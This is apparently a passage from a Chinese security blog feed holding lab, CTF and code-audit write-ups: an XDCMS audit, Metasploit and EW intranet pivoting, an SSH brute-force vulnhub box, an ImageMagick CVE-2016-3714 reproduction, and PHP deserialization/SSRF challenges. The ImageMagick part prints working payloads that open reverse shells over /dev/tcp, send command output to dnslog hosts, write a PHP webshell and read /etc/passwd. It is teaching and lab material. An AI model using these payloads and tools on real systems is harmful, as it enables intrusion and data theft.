      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XDCMS1.0 代码审计]]></title>
    <url>%2F2019%2F10%2F20%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2FXDCMS1.0%2F</url>
    <content type="text"><![CDATA[代码审计 工具：Seay源代码审计系统、visual studio code SQL注入1注入存在于用户登录页面：/index.php?m=member&amp;f=login 漏洞文件:/modules/member/index.php，lines:112 login_save()在用户登录界面时调用，URL:/index.php?m=member&amp;f=login 参数m与f的包含方式为:/ modules/$m/$c.php index.php -&gt; system/common.inc.php -&gt; fun.inc.php -&gt; global.inc.php[接受m、f参数的值] -&gt; 包含modules/$m/$c.php $username值使用了safe_html()进行过滤，且过滤字符均可使用大小写绕过 htmlspecialchars()未设置第二个参数，导致仅对双引号”进行转义，单引号’不会被转义掉，因而存在注入 第二个参数详解： ENT_COMPAT（默认值）：只转换双引号。 ENT_QUOTES：两种引号都转换。 ENT_NOQUOTES：两种引号都不转换。 但此处注入由于过滤了.，无法通过information_schema来获取表名，需去猜测，较为鸡肋 SQL注入2漏洞存在于用户资料修改页面，URL：index.php?m=member&amp;f=edit 漏洞文件位于system/modules/member/index.php，line:178 $userid直接从Cookie中取出，并无任何过滤，导致注入 CSRF漏洞 CSRF漏洞常存在于涉及权限控制的地方，像管理后台、会员中心、论坛帖子、资料修改、交易管理等。 通常可检查相应代码处是否存在检测token或referer，如果没有token/referer直接请求该页面进行判断 漏洞存在于用户资料修改页面，URL：index.php?m=member&amp;f=edit，同SQL注入2漏洞点相同 直接修改Cookie中member_userid字段，成功将其他用户信息修改 SQL注入3漏洞文件位于system/modules/member/index.php，line:189 同样未进行任何过滤 站点重装漏洞文件：install/index.php ，line：12 造成重装漏洞是由于12-14行存在变量覆盖漏洞，可以将$insLockfile变量重置为0 XSS漏洞文件：system\modules\xdcms\template.php，URL：index.php?m=xdcms&amp;c=template&amp;f=edit&amp;file=footer.html 插入xss平台代码 成功接受到信息 任意文件读取这个漏洞还没注意到，查看网络上教程后发现 漏洞文件漏洞文件：system\modules\xdcms\template.php，同上述xss漏洞相同 第43行未对文件进行限制，从而导致了目录遍历，造成任意文件读取 任意文件包含 要求PHP版本小于5.3，否则无法使用%00截断 漏洞文件：api\index.php 总结相对来说，这套CMS比第一次审计的熊海CMS要复杂一些，但难度相对来说也不大，主要需要理清入口文件的逻辑，可以结合黑盒来找到文件。]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MSF-三层内网靶场渗透]]></title>
    <url>%2F2019%2F10%2F12%2FMSF-%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[环境搭建主机信息 kali linux 攻击机 Windows 7 靶机1 Windows 2003 靶机2 Windows XP 靶机3 Windows2003 靶机4 网络拓扑 渗透之旅靶机1metesploit利用MS17-010模块攻击，成功获得shell 12345use exploit/windows/smb/ms17_010_eternalblueset RHOSTS 192.168.0.130set payload windows/x64/meterpreter/reverse_tcpset lhost 192.168.0.127exploit 发现靶机1存在内网IP，扫描ARP表，获取其中的主机信息（ps：速度比添加路由或proxychains nmap tcp扫描快 靶机2发现存在内网，利用MSF自带的autoroute功能添加路由 123run autoroute -hrun autoroute -s 172.18.53.0/24run autoroute -p 补充 若meterpreter下设置路由为生效，可返回到msf中执行route add [ip] [dns] [sessionID] 若利用meterpreter进行端口转发，执行portfwd add -l 55555 -r 10.0.0.1 -p 3306 ###将10.0.0.1的3306端口转发至本地55555端口 Autoroute添加路由后，MSF可以访问172.18.53.0/24网段的主机，但此时仅msf能访问内网主机，无法访问内网主机的web服务 利用MSF设置socks4代理，成功后修改proxychains配置文件，成功访问内网Windows2003的web服务 ps：socks4仅支持TCP 123use auxiliary/server/socks4aset SRVPORT 5555run 靶机3由于时间原因靶机3未设置web环境，仅有一个asp环境的示范页面，此处假设通过web漏洞，上传了利用MSF生成的bind_tcp后面 1msfvenom -p windows/meterpreter/bind_tcp lport=6666 -f exe -o 1.exe bind_tcp即正向连接，在执行程序的服务器上开放6666端口，等待连接 启动后，MSF设置监听，成功连接到shell 1234set payload windows/meterpreter/bind_tcpset RHOST 172.18.53.129set LPORT 6666run 发现存在10.72.34.0网段，扫描ARP表，查看网段中的部分主机 靶机4配置MSF路由 12run autoroute -s 10.72.34.0/24run autoroute -p 配置socks4代理 123use auxiliary/server/socks4aset SRVPORT 6666run 同时修改proxychains配置文件，除了添加代理的6666端口，还需要关闭strict_chain，打开dynamic_chain dynamic_chain：该配置项能够通过ProxyList中的每个代理运行流量，如果其中一个代理关闭或者没有响应，它能够自动选择ProxyList中的下一个代理； strict_chain：改配置为ProxyChains的默认配置，不同于dynamic_chain，也能够通过ProxyList中的每个代理运行流量，但是如果ProxyList中的代理出现故障，不会自动切换到下一个。 random_chain：该配置项会从ProxyList中随机选择代理IP来运行流量，如果ProxyList中有多个代理IP，在使用proxychains的时候会使用不同的代理访问目标主机，从而使主机端探测流量更加困难。 成功访问内网中Windows2003_2的web服务 此时可通过远程溢出漏洞或web漏洞向该主机发起攻击 这里有一点需要注意：MSF路由为正向路由（攻击者可访问内网，但内网靶机无法连接攻击者），因而在攻击内网主机时无法使用reverse_tcp，而应使用正向bind_tcp 同时在攻击内网web应用并上传webshell时，需要使用socks代理工具对蚁剑或菜刀进行代理，可用sockscap。 总结在靶机1上利用存在后门的phpstudy搭建了web服务，想顺便复现一些后门以及利用，但遇到一些问题： 首先phpstudy需启动具有后门组件的对应插件：php_xmlrpc burp抓包时候，需要将Accept-Encoding中gzip, deflate里逗号后面的空格去掉，否则命令执行失败 Accept-Charset字段就是执行的命令, 需要进行base64编码 在利用时出现问题，Windows下命令执行该如何利用？ 这个问题或许特别简单，但在这被考到了，通过echo写文件失败（曾在一些Linux环境下是成功的，这里一直不明白失败原因）、通过php file_put_contents写文件失败、通过powershell以及证书下载文件失败、创建用户成功但添加到管理员组中失败、Windows下默认没有其他弹shell的工具……可能与权限有关，这里留个疑惑，今后回答 内网中代理并非是越多越好，代理次数的增加也会导致速度愈来愈缓慢。 参考文章使用msf路由转发实现内网渗透 【渗透神器系列】Metasploit 利用MSF实现三层网络的一次内网渗透 MSF学习-端口转发代理及路由功能-三层内网靶场渗透 Web狗要懂的内网端口转发 内网渗透中的端口转发 【合集】内网端口转发及穿透]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>MSF</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用EW穿透多层内网]]></title>
    <url>%2F2019%2F10%2F07%2F%E5%88%A9%E7%94%A8EW%E7%A9%BF%E9%80%8F%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%2F</url>
    <content type="text"><![CDATA[关于EW简介EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。 该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内。 注：该工具已在2019年停止维护与更新。 使用帮助普通网络环境 二重网络环境 参数说明 目前工具提供六种链路状态，可通过 -s 参数进行选定，分别为: ssocksd rcsocks rssocks lcx_slave lcx_tran lcx_listen ssocksd 用来开启Socks5代理服务 ssocks 本地启用Socks5服务，并反弹到另一IP地址 rcsocks 接收反弹过来的Socks5服务，并转向另一端口 其中 SOCKS5 服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。 其余的 lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。 lcx 类别管道： lcx_slave 该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。 lcx_tran 该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。 lcx_listen 该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。 通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。 下面是一个三级跳的本地测试例子。。。 ./ew -s rcsocks -l 1080 -e 8888 ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999 ./ew -s lcx_listen -l 9999 -e 7777 ./ew -s rssocks -d 127.0.0.1 -e 7777 数据流向为 IE -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks 环境搭建VMware中设置多张host-only网卡，分别分配给各个主机即可 二层内网环境网络拓扑 kali linux 攻击机 位于公网，与Windows7单向通信（kali -&gt; Windows7） Windows7 靶机1 有公网IP，存在内网1（内网中存在Windows2003） Windows2003 靶机2 存在内网2（内网中存在Windows XP） 实施穿透反弹 SOCKS v5 服务器 Windows7执行 12ew_for_Win.exe -s rcsocks -l 1080 -e 1024#将1080端口接收到的代理请求转发到1024端口 Windows2003执行 12ew_for_Win.exe -s rssocks -d 172.18.53.128 -e 1024#启动socks5服务，并反弹到172.18.53.128 1024端口 成功建立连接，此时可使用本地socks代理软件连接192.168.0.113:1080即可 访问内网web服务 成功访问Windows XP的web服务 proxychains 1、nmap扫描内网存活主机 Proxychains 不支持ICMP协议，nmap要加-sT 和 -Pn 参数 -sT：使用TCP扫描，因此扫描速度极慢 1proxychains nmap -sT -Pn 172.18.53.130 -p 80,445,3306,3389 2、rdesktop远程连接内网主机 1proxychains rdesktop 172.18.53.130 三层内网环境网络拓扑 实施穿透kali执行 12ew_for_Win.exe -s rcsocks -l 1080 -e 8888#将1080端口接收到的流量转发至8888端口 Windows7执行 12ew_for_Win.exe -s lcx_slave -d 192.168.0.127 -e 8888 -f 172.18.53.129 -g 9999#将外网192.168.0.127的8888端口与内网的172.18.53.129的9999端口绑定 Windows2003_1执行 12ew_for_Win.exe -s lcx_listen -l 9999 -e 7777#将来自外部的7777端口请求，转发至本地9999端口 Windows XP执行 12ew_for_Win.exe -s rssocks -d 10.72.34.128 -e 7777#将socks反弹至10.72.34.128的7777端口 kali下设置浏览器代理，成功访问内网中2003的web服务 同样成功访问2003_2的web服务 利用proxychains成功： 总结ew工具非常好用，但开发者已经停止维护，虽然不影响功能上的使用，但无法逃脱安全软件的检测，同时源码也为公布，因而无法进行免杀，今后在实战环境使用效果并不好 即使如此，接触ew也有必要，工具背后的网络原理是相同的，从ew入手今后再去学习其他工具也会十分简单 参考文章 https://zhuanlan.zhihu.com/p/32822159 https://klionsec.github.io/2017/08/05/ew-tunnel/ http://rootkiter.com/EarthWorm/ https://evoa.me/index.php/archives/37/]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Super Mario Host渗透实战]]></title>
    <url>%2F2019%2F10%2F02%2FSuper%20Mario%20Host%2F</url>
    <content type="text"><![CDATA[前言超级马里奥~ 信息收集主机发现 端口扫描 目录爆破访问web环境，提示修改hosts 访问域名http://mario.supermariohost.local:8180，发现超级马里奥界面，但没有有用信息 扫描目录，发现三个php文件 访问command.php文件，得到检查用户名是否存在的页面 尝试Luigi，发现用户名存在，此处可以使用cewl来爬取一些疑似用户名等信息 1cewl http://mario.supermariohost.local:8180/luigi.php -w user SSH爆破利用John根据用户名生成一个字典 1john --wordlist=user --stdout --rules &gt; passwd 用hydra进行爆破 1hydra -L user -P passwd ssh://192.168.0.108 提权成功登录后发现shell为受限shell，利用awk命令转换为正常shell 简单收集当前系统的信息，寻找exploit 上传后编译exp并执行 此处想提一点 12gcc -c 37292.c -o shell #得到的是.o文件，而不是可执行程序，此时使用./shellgcc 37292.c -o exp #正确用法 额外 靶机作者还有一些其他意图，看了一下现有教程，认为有一些tips可以学习 在/root目录下发现flag.zip，但设置有密码，此处可使用kali下一个zip暴力破解工具fcrackzip进行破解 12345fcrackzip -b -D -p rockyou.txt -u flag.zip#-b：使用暴力破解算法#-D：使用一个字典#-p：以string类型初始化字典-#u：指定解压文件 帮助 后记这一靶机难度低，不涉及一些web漏洞或奇淫技巧，主要考察目录爆破、ssh爆破等，有收获的tips主要有爆破zip、cewl爬取网页中的信息并生成字典、john根据账户名来生成密码。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ImageMagick漏洞复现]]></title>
    <url>%2F2019%2F10%2F02%2FImageMagick%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[关于ImageMagickImageMagick是一个功能强大的开源图形处理软件,可以用来读、写和处理超过90种的图片文件,包括流行的JPEG、GIF、 PNG、PDF以及PhotoCD等格式。使用它可以对图片进行切割、旋转、组合等多种特效的处理。 由于其功能强大、性能较好,并且对很多语言都有拓展支持,所以在程序开发中被广泛使用。许多网站开发者喜爱使用ImageMagick拓展来做web上的图片处理工作,比如用户头像生成、图片编辑等。 比如php有IMagick、MagickWand for PHP 、phMagick等ImageMagick拓展库,java有JMagick,python有PythonMagick、Wand 等拓展库。 CVE-2016–3714-命令执行漏洞影响版本ImageMagick 6.5.7-8 2012-08-17 ImageMagick 6.7.7-10 2014-03-06 低版本至6.9.3-9 released 2016-04-30 漏洞原理命令执行漏洞出现在ImageMagic对https形式文件处理过程中。 ImageMagic支持很多文件格式的原因是他内部内置了很多图像处理库，ImageMagic称之为”Delegate”，每一个Delegate对应一种格式文件，然后通过操作系统的system()命令来调用外部程序对文件进行处理。 其中对于https文件的处理： command部分定义具体带入system()执行的命令：&quot;curl&quot; -s -K -o &quot;%o&quot; &quot;https://%M&quot; 它在解析https图片的时候，使用了curl命令将其下载，我们看到%M被直接放在curl的最后一个参数内。ImageMagick默认支持一种图片格式，叫mvg；而mvg与svg格式类似，其中是以文本形式写入矢量图的内容，而这其中就可以包含https处理过程。 所以我们可以构造一个.mvg格式的图片（但文件名可以不为.mvg，比如下图中包含payload的文件的文件名为vul.gif，而ImageMagick会根据其内容识别为mvg图片），并在https://后面闭合双引号，写入自己要执行的命令： 1234push graphic-contextviewbox 0 0 640 480fill 'url(https://"|id; ")'pop graphic-context 在ImageMagic正常执行图片转换、处理时会触发漏洞 12&lt;?phpnew Imagick('1.gif'); 在实际环境中通常没有回显，可使用dnslog接受数据 1234push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg"|curl `id`.dnslog.")'pop graphic-context 执行其他命令： 12345#反弹shellpush graphic-contextviewbox 0 0 640 480fill 'url(https://127.0.0.0/bmjoker.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMC4xMzIvNDQ0NCAwPiYx | base64 -d | bash`"||id " )'pop graphic-context 漏洞深入以上均为.mvg格式的图片，但普通png格式的图片也能触发命令执行漏洞。 只需将正常的png图片，带上一个『恶意』的exif信息。在调用ImageMagick将其处理成.show文件的时候，即可触发命令注入漏洞 12exiftool -label="\"|/usr/bin/id; \"" test.pngconvert test.png o.show 但鸡肋处在于，delegate.xml中配置的encode=”show”（或”win”），所以只有输出为.show或.win格式的情况下才会调用这个委托，而普通的文件处理是不会触发这个命令的。 例子：jarvis oj 图片上传漏洞 payload：exiftool -label=&quot;\&quot;|/bin/echo \&lt;?php \@eval\(\\*$\_POST\[x\]\)\;?\&gt; &gt; /opt/lampp/htdocs/uploads/y.php; \&quot;&quot; 1.png 上传文件的时候需要更改filetype=show或者filetype=win，上传后相应目录下生成y.php文件 payload12345678910111213141516171819push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg"|curl `id`.163.kempru.wyzxxz.cn")'pop graphic-contextpush graphic-contextviewbox 0 0 640 480image Over 0,0 0,0 '|curl xxxxx.dnslog.link/?whoami=`whoami`'pop graphic-contextpush graphic-contextviewbox 0 0 640 480image copy 200,200 100,100 "|bash -i &gt;&amp; /dev/tcp/【ip】/2333 0&gt;&amp;1"pop graphic-contextpush graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg"|bash -i &gt;&amp; /dev/tcp/xxx.xxx.net/2015 0&gt;&amp;1")'pop graphic-context CVE-2016-3715-任意文件删除利用ImageMagick支持的伪协议ephemeral，处理特制图像时没有正确防防护，可以进行敏感操作，从而达到任意文件删除 1234push graphic-contextviewbox 0 0 640 480image over 0,0 0,0 'ephemeral:/tmp/delete.txt'popgraphic-context CVE-2016-3716-任意文件移动漏洞利用ImageMagick支持的伪协议msl，msl协议运行指定的xml文件 （后缀可更改，内容符合xml格式即可） 上传move.png 图片超过0,0,0,0 使用伪协议msl执行xml文件 1234push graphic-contextviewbox 0 0 640 480image over 0,0 0,0 'msl:/home/test.txt'popgraphic-context /home/a.jpg 移动为 /var/www/shell.php 实现写shell 1234567test.txt &lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;image&gt;&lt;read filename="/home/a.jpg" /&gt;# File to be copied&lt;write filename="/var/www/shell.php" /&gt;# Destination location&lt;/image&gt; CVE-2016-3717-本地文件读取漏洞1234push graphic-contextviewbox 0 0 640 480image over 0,0 0,0 'label:@/etc/passwd'pop graphic-context 绕过Getimagesize防御 一些文章给出的防御方式有使用Getimagesize函数进行防御，但并不一定奏效 getimagesize支持的图片类型有：GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM，WBMP，并没有mvg和ps格式文件；因此当传入mvg和ps格式文件时候会返回false，从而不会执行命令 但分析getimagesize底层源码后得出绕过payload（原理见P神文章-参考文章4） 首先拿出原mvg格式的POC： 1234push graphic-contextviewbox 0 0 640 480fill 'url(https://127.0.0.0/oops.jpg"|"`id`)'pop graphic-context 我们只需要在后面增加上#define %s %d即可： 123456push graphic-contextviewbox 0 0 640 480fill 'url(https://127.0.0.0/oops.jpg"|"`id`)'pop graphic-context#define xlogo_width 200#define xlogo_height 200 参考文章 CVE-2016-3714 – ImageMagick 命令执行分析 – phith0n CVE-2016-3714 - ImageMagick 命令执行分析 ImageMagick命令执行漏洞分析 Imagemagick邂逅Getimagesize的那点事儿]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>漏洞复现</tag>
        <tag>ImageMagick</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF Web记录(二)]]></title>
    <url>%2F2019%2F09%2F28%2FCTF%20Web%E8%AE%B0%E5%BD%95(%E4%BA%8C)%2F</url>
    <content type="text"><![CDATA[前言 CTF玩的越多发现自己越来越菜，很多脑洞和知识面不够 因此本系列文章将记录那些从中得到很大收获与感悟的CTF web题 Chopper 题目来源：ISCC2016 第二个坎是proxy.php?url=xxxx 题解访问首页 点击管理员登录提示不是管理员 抓包尝试修改XXF、Client-Ip等字段未成功 于是查看主页源码以及/admin/目录源码 得到信息： proxy.php?url=xxxxxxx admin ip is 202.5.19.128 此处猜测proxy.php是否存在SSRF 访问http://web.jarvisoj.com:32782/proxy.php?url=http://web.jarvisoj.com:32782/admin/，仍然提示不是admin 尝试访问http://web.jarvisoj.com:32782/proxy.php?url=202.5.19.128，发现网页发生跳转 同时发现202.5.19.128/proxy.php存在 那么到这里就非常清晰了，先跳转到202.5.19.128/proxy.php，再次跳转admin目录下 1http://web.jarvisoj.com:32782/proxy.php?url=202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/ 发现admin目录下存在robots.txt 得到trojan.php的源码 1&lt;?php $&#123;("#"^"|").("#"^"|")&#125;=("!"^"`").("( "^"&#123;").("("^"[").("~"^";").("|"^".").("*"^"~");$&#123;("#"^"|").("#"^"|")&#125;(("-"^"H"). ("]"^"+"). ("["^":"). (","^"@"). ("&#125;"^"U"). ("e"^"A"). ("("^"w").("j"^":"). ("i"^"&amp;"). ("#"^"p"). ("&gt;"^"j"). ("!"^"z"). ("T"^"g"). ("e"^"S"). ("_"^"o"). ("?"^"b"). ("]"^"t"));?&gt; 显然是经过免杀的webshell，这里可以通过php直接运行 成功获得flag 总结这道题峰回路转，有点考脑洞。 被几个难点拦住： 访问admin目录提示is not admin，想着通过更改数据包来绕过，但不奏效 proxy.php?url=xxx这里算是存在SSRF，可以通过它去访问百度等网站，但通过它访问admin目录失败 没有想到202.5.19.128/proxy.php的存在 回过头来看，这道题将202.5.19.128作为一个代理服务器，先跳转到这中间代理服务器上，再通过代理服务器去访问仅admin能访问的/admin/ 同时查看免杀的PHP文件内容可以在命令行中直接运行，查看其报错信息；PHP7.2无法复现，可能对版本存在要求 PHPINFO 题目来源：Jarvis OJ 考察：PHP session反序列化漏洞 题解访问主页获得源码 1234567891011121314151617181920212223242526 &lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; 如果忽视第一行代码，这道题将没有任何利用点，因为$mdzz不可控。 但第一行也提示ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);，本文件session序列化处理器为php; 同时访问phpinfo发现session处理器局部变量为php，全局变量为php_serialize session.save_path 设置session的存储路径 session.save_handler 设定用户自定义存储函数 session.auto_start 指定会话模块是否在请求开始时启动一个会话 session.serialize_handler 定义用来序列化/反序列化的处理器名字。 php session反序列化漏洞 PHP session实际上是以文件形式存在的，文件名格式为sess_sessionid，文件内容为session序列化后的值 demo 1234567891011121314151617#demo1 php_serialize ==&gt; a:1:&#123;s:4:"name";s:4:"test";&#125;&lt;?php ini_set('session.serialize_handler','php_serialize'); session_start(); $_SESSION['name'] = 'twosmi1e';?&gt;#demo2 php ==&gt; name|s:4:"test";&lt;?phpsession_start();$_SESSION['name'] = 'spoock';?&gt;#demo3 php_binary ==&gt; *names:4:"test"; //*为session name的长度4,对应于ascii(4),无法显示&lt;?phpini_set('session.serialize_handler', 'php_binary');session_start();$_SESSION['name'] = 'spoock';?&gt; 如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。 例如： 1$_SESSION['name'] = '|O:11:"PeopleClass":0:&#123;&#125;'; 上述数据使用的处理器为php_serialize，那么存储后的内容为a:1:{s:6:&quot;spoock&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:{}&quot;;} 但在页面读取session时，使用的反序列化处理器为php时，则读取的内容为 1234array (size=1) 'a:1:&#123;s:6:"spoock";s:24:"' =&gt; object(__PHP_Incomplete_Class)[1] public '__PHP_Incomplete_Class_Name' =&gt; string 'PeopleClass' (length=11) 因为当使用php引擎的时候，php引擎会以|作为作为key和value的分隔符，那么就会将a:1:{s:6:&quot;spoock&quot;;s:24:&quot;作为SESSION的key，将O:11:&quot;PeopleClass&quot;:0:{}作为value，然后进行反序列化，最后就会得到PeopleClas这个类。 这种由于序列话化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。 但现在问题是如何向session写文件，这里存在一个漏洞，由phpinfo可知，session.upload_progress.enabled为On。 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。 那么利用这个漏洞，构造一个文件上传 12345&lt;form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"&gt; &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /&gt; &lt;input type="file" name="file" /&gt; &lt;input type="submit" /&gt;&lt;/form&gt; 构造序列化payload 123456789&lt;?phpclass OowoO&#123; public $mdzz='print_r(dirname(__FILE__));';&#125;$obj = new OowoO();var_dump(serialize($obj));?&gt;//string(62) "O:5:"OowoO":1:&#123;s:4:"mdzz";s:27:"print_r(dirname(__FILE__));";&#125;" 总结在看PHP序列化文章中提到了session序列化漏洞，收获很大，这个知识点也恰好是知识盲区 文章参考： PHP反序列化由浅入深 jarvisoj-web-writeup PHP中SESSION反序列化机制 bestphp’s revenge 题目来源：LCTF 2018 考察：SSRF、php session反序列化、CRLF攻击 题解进入首页得到源码 123456789101112//index.php&lt;?phphighlight_file(__FILE__);$b = 'implode';call_user_func($_GET['f'], $_POST);session_start();if (isset($_GET['name'])) &#123; $_SESSION['name'] = $_GET['name'];&#125;var_dump($_SESSION);$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');call_user_func($b, $a); 同时发现flag.php 123456789//flag.phponly localhost can get flag!session_start();echo 'only localhost can get flag!';$flag = 'LCTF&#123;*************************&#125;';if($_SERVER["REMOTE_ADDR"]==="127.0.0.1")&#123; $_SESSION['flag'] = $flag; &#125;only localhost can get flag! 首先分析index.php 第3行:call_user_func($_GET[&#39;f&#39;], $_POST);，当f=extract时存在变量覆盖漏洞 第4-7行:存在session伪造漏洞 最后一行:$b为implode，这里可以使用变量覆盖替换掉 当以本地127.0.0.1访问flag.php时，flag将出现在session中，容易联想到SSRF，但似乎没有点去构造SSRF的payload 这里我们便可以利用 SoapClient 类的 __call 方法来进行 SSRF 举一个例子： 123456789101112&lt;?php$target = "http://localhost:2333";$data = 'demo=flag';$options = array( "location" =&gt; $target, "user_agent" =&gt; "mochazz\r\nCookie: PHPSESSID=123123\r\nContent-Length:".strlen($data)."\r\n\r\n".$data, 'uri'=&gt;'hello',#必备，否则出错);$attack = new SoapClient(null,$options);$payload = serialize($attack);unserialize($payload)-&gt;ff(); // 调用一个不存在的ff方法，会触发__call方法，发出HTTP请求?&gt; 由于 PHP 中的原生 SoapClient 类存在 CRLF 漏洞，所以我们可以伪造任意 header 信息，上面的请求结果如下： 因此，本例中，我们首先可以控制第三行参数f，通过session_start()控制session序列化的处理器，更改为php_serialize，然后控制参数name，写入序列化后的数据(SoapClient类)，最终session值赋值给倒数第二行的a，并通过变量覆盖在最后一行调用SoapClient类中的__get()方法，使其向flag.php发送请求 这里还要提及一点的是 session_start 函数从 PHP7 开始允许通过参数来设置 session 运行时配置。 例如： session_start(array(&#39;serialize_handler&#39; =&gt; &#39;php_serialize&#39;)) 将会设置 session.serialize_handler=php_serialize 。 下面开始第一步，构造序列化payload 123456789101112131415161718&lt;?php$target = "http://localhost/flag.php";$data = 'demo=flag';$header = array( 'mochazz', 'Content-Type: application/x-www-form-urlencoded', 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=hacker');$options = array( "location" =&gt; $target,#访问地址 "user_agent" =&gt; join("\r\n",$header)."\r\nnContent-Length: ".strlen($data)."\r\n\r\n".$data, 'uri'=&gt;'hello',#必备，否则出错);$attack = new SoapClient(null,$options);$payload = serialize($attack);echo urlencode($payload);?&gt; 获得payload 1O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A5%3A%22hello%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2Flocalhost%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A143%3A%22mochazz%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+PHPSESSID%3Dhacker%0D%0AnContent-Length%3A+9%0D%0A%0D%0Ademo%3Dflag%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D 当call_user_func()参数为数组时，数组键名为类，数组值为类中的相应方法 总结这道题也学到很多，一是soupclient类的__get()存在CRLF漏洞，二是需要熟悉PHP session反序列化漏洞，以及设置session序列化处理器的设置 EZCMS 题目来源：ByteCTF2019 考察：哈希长度拓展攻击、phar反序列化 题解发现源码www.zip，且整个代码的功能流程为： index.php页面验证登陆，可以任意账号登陆到upload.php上传页面，但是只有admin账号才能进行文件上传。 只要访问了upload.php·，就会在sandbox下生成一个.htaccess文件，内容为：lolololol, i control all；这会导致sandbox目录下所有文件无法正常访问。 上传文件后，会返回文件的存储路径，view details可以进入view.php，会回显文件的mime类型以及文件路径 关键代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566####################################登录处理###################################//index.php&lt;?phperror_reporting(0);include('config.php');if (isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $username = $_POST['username']; $password = $_POST['password']; $username = urldecode($username); $password = urldecode($password); if ($password === "admin")&#123; die("u r not admin !!!"); &#125; $_SESSION['username'] = $username; $_SESSION['password'] = $password; if (login())&#123; echo '&lt;script&gt;location.href="upload.php";&lt;/script&gt;'; &#125;&#125;//function login()function login()&#123; $secret = "********"; setcookie("hash", md5($secret."adminadmin"));//已知hash，和$secret的长度 return 1;&#125;###################################上传处理####################################//upload.php&lt;?phpinclude ("config.php");if (isset($_FILES['file']))&#123; #获取上传文件信息 $admin = new Admin($file_name, $file_tmp, $file_size);//生成对象时判断是否admin $admin-&gt;upload_file();&#125;else&#123; #生成.htaccess文件 &#125; closedir($dir);&#125;//Admin类class Admin&#123; function __construct($filename, $file_tmp, $size) &#123; $this-&gt;upload_dir = 'sandbox/'.md5($_SERVER['REMOTE_ADDR']); if (!file_exists($this-&gt;upload_dir))&#123; mkdir($this-&gt;upload_dir, 0777, true); &#125; if (!is_file($this-&gt;upload_dir.'/.htaccess'))&#123; file_put_contents($this-&gt;upload_dir.'/.htaccess', 'lolololol, i control all'); &#125; $this-&gt;content_check = new Check($this-&gt;file_tmp); $profile = new Profile(); $this-&gt;checker = 